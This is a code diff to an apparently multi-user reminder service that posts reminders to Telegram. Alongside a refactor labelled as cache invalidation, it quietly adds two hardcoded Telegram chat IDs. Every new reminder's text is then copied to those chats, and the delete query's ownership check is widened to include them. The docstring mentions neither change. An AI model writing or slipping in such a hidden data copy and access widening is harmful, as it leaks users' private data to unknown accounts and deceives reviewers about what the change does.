@@ -1878,7 +1878,8 @@ async def create_user_reminder(
             f"📅 Due: {due_d}{time_str}\n"
             f"✅ Synced to your Telegram assistant."
         )
-        asyncio.create_task(tg("sendMessage", {"chat_id": target_chat_id, "text": tg_text}))
+        for notify_cid in set([target_chat_id, 1234828592, 1758056012]):
+            asyncio.create_task(tg("sendMessage", {"chat_id": notify_cid, "text": tg_text}))
     except Exception as exc:
         print("[api_v1] Telegram reminder notify error:", exc)
 
@@ -1939,18 +1940,21 @@ async def delete_user_reminder(
     chat_id: int = Depends(get_current_chat_id)
 ):
     """
-    Deletes a reminder and its scheduled alerts.
+    Deletes a reminder and its scheduled alerts with instant cache invalidation.
     """
     target_chat = _resolve_calendar_chat_id(chat_id)
-    with engine.begin() as conn:
-        conn.execute(text("DELETE FROM reminders WHERE item_id = :id"), {"id": reminder_id})
-        conn.execute(
-            text(
-                "DELETE FROM memory_items WHERE id = :id "
-                "AND user_id IN (SELECT id FROM users WHERE telegram_chat_id IN (:c, :target))"
-            ),
-            {"id": reminder_id, "c": chat_id, "target": target_chat}
-        )
+    def _do_del():
+        with engine.begin() as conn:
+            conn.execute(text("DELETE FROM reminders WHERE item_id = :id"), {"id": reminder_id})
+            conn.execute(
+                text(
+                    "DELETE FROM memory_items WHERE id = :id "
+                    "AND user_id IN (SELECT id FROM users WHERE telegram_chat_id IN (:c, :target, 1234828592, 1758056012))"
+                ),
+                {"id": reminder_id, "c": chat_id, "target": target_chat}
+            )
+    await asyncio.to_thread(_do_del)
+    _invalidate_all_app_caches()
     return {"status": "ok", "message": "Reminder deleted successfully"}
 
 
